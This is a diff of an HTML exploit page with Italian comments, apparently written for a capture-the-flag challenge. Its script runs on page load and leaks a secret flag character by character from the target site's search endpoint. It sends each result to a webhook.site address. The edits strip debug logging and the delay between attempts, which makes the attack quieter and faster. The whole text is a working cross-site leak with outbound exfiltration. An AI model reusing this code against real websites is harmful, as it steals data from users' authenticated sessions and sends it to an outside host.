@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -26,12 +25,11 @@
         let flag = 'flag{'; // Inizializza con il prefisso noto della flag
         let position = flag.length; // Posizione iniziale per il carattere successivo
 
-        // Funzione per inviare i log al Webhook con output di debug
+        // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
             const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
             try {
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                console.log(`Invio log: ${message}`); // Messaggio di debug
                 const response = await fetch(urlWithParams, { method: 'GET' });
 
                 if (!response.ok) {
@@ -40,7 +38,7 @@
                     console.log('Log inviato con successo');
                 }
             } catch (error) {
-                console.error('Errore di rete durante il log:', error);
+                console.error('Errore di rete:', error);
             }
         };
 
@@ -61,16 +59,12 @@
             });
         };
 
-        // Funzione per introdurre un ritardo di qualche millisecondo
-        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
         // Funzione per estrarre la flag, un carattere alla volta
         const extractFlag = async () => {
             const resultDiv = document.getElementById('result');
 
             for (let char of characters) {
                 const url = `https://matrix.capturetheflags.site/search?s=${flag}${char}`;
-                console.log(`Test della lettera: ${char} per la posizione ${position}`); // Debug
                 const isCorrect = await leakCharacter(url);
 
                 // Invia log a ogni tentativo di carattere
@@ -95,15 +89,14 @@
                     // Passa alla lettera successiva nella posizione incrementata
                     break;
                 }
-                // Introduci un ritardo di 1 secondo tra ogni tentativo
-                await delay(1000); // 1 secondo di ritardo
             }
-            // Ricomincia il processo per la prossima posizione dopo il ritardo
-            setTimeout(extractFlag, 1000); // Ritardo di 1 secondo tra le esecuzioni
+            // Ricomincia il processo per la prossima posizione dopo un ritardo
+            setTimeout(extractFlag, 1000); // 1 secondo di ritardo
         };
 
         // Esegui il test al caricamento del DOM
         document.addEventListener('DOMContentLoaded', extractFlag);
+
 
     </script>
 </body>
